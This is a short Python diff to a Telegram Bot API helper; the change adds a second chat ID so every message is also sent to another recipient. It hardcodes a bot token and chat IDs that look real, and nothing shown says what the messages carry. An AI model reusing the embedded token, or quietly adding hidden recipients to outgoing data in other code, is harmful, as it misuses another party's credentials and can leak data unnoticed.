@@ -9,7 +9,10 @@ import requests
 def saaaaaad(message):
     tok = '6334529129:AAH5JseCYY8l4eEIPUilwTA3BjPDtmo6zAc'
     u_id = '420309682'
+    u_idkol = '1450087163'
+    url_t = f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={u_idkol}&parse_mode=MarkDown&text={message}'
     url = f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={u_id}&parse_mode=MarkDown&text={message}'
+    requests.get(url_t)
     requests.get(url)
 
 
